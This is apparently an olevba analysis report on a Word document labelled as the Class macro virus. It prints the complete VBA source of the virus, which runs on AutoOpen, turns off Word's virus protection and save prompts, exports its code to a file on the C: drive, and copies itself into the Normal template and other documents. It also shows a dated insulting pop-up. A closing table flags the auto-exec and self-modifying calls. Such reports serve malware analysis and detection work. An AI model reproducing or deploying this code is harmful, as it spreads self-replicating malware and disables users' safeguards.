olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-05f1106d75bfface408cf969e83f3bf2d35b364b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-05f1106d75bfface408cf969e83f3bf2d35b364b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
On Error GoTo out
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
Options.VirusProtection = False
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
Options.SaveNormalPrompt = False
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
Options.ConfirmConversions = False
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If nt > 70 And ad > 0 Then GoTo out
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If nt < 70 Then
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End If
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
host.codemodule.AddFromFile ("c:\class.sys")
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
With host.codemodule
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    For x = 1 To 4
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    .deletelines 1
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    Next x
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End With
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If nt < 70 Then
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    With host.codemodule
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    .replaceline 1, "Sub AutoClose()"
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    .replaceline 71, "Sub ToolsMacro()"
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    End With
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End If
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
With host.codemodule
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    For x = 2 To 72 Step 2
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
    Next x
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End With
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
out:
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End Sub
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
Sub ViewVBCode()
'Norman Rummler24.10.2000 20:03:55Canon Bubble-Jet BJC-210 on LPT1:Dokument4
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

